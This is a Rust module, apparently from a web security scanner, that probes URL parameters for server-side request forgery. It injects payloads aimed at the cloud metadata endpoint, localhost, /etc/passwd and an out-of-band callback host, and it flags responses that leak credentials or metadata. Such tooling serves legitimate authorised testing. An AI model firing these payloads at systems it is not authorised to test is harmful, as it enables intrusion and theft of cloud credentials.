use crate::http::HttpClient;
use crate::types::{Finding, Mode, Severity};
use anyhow::Result;

/// Blind SSRF proof via OOB callback.
/// If `oob_host` is provided (your collaborator/listener), payloads point there;
/// a successful callback = confirmed SSRF. If not provided, we only flag error
/// leakage / differential responses (no false "confirmed").
pub async fn scan(http: &HttpClient, target: &str, params: &[String], _mode: Mode, oob_host: &str) -> Result<Vec<Finding>> {
    let mut out = Vec::new();
    let base = target.trim_end_matches('/');

    // Candidate internal/remote targets to force the app to fetch.
    let mut sinks: Vec<String> = vec![
        "http://169.254.169.254/latest/meta-data/".to_string(),
        "http://localhost:80/".to_string(),
        "http://127.0.0.1:8080/".to_string(),
        "file:///etc/passwd".to_string(),
    ];
    if !oob_host.is_empty() {
        sinks.push(format!("http://{}/oob-ssrf", oob_host));
        sinks.push(format!("http://{}.oob.sumopod.test/", oob_host)); // DNS-based OOB
    }

    for p in params {
        for sink in &sinks {
            let u = inject(base, p, sink);
            if let Ok((_st, _h, body, _f)) = http.get(&u).await {
                eprintln!("[ssrf_oob] {} -> body_len={} has_meta={}", u, body.len(), body.to_lowercase().contains("169.254.169.254"));
                let lb = body.to_lowercase();
                if lb.contains("root:") || lb.contains("security-credentials") || lb.contains("169.254.169.254") || lb.contains("metadata") {
                    out.push(Finding::new(Severity::High, "SSRF", "SSRF error leakage reveals internal fetch", &u)
                        .with_param(p)
                        .with_payload(sink)
                        .with_evidence("response exposes internal metadata content")
                        .with_confidence(80));
                }
            }
        }
    }

    // OOB hint
    if !oob_host.is_empty() {
        out.push(Finding::new(Severity::Info, "SSRF", "OOB SSRF test armed", base)
            .with_payload(&format!("oob_host={}", oob_host))
            .with_note("check your listener for callback to confirm blind SSRF")
            .with_confidence(10));
    }
    Ok(out)
}

fn inject(base: &str, key: &str, val: &str) -> String {
    if base.contains('?') {
        format!("{}&{}={}", base, key, val)
    } else {
        format!("{}/?{}={}", base, key, val)
    }
}
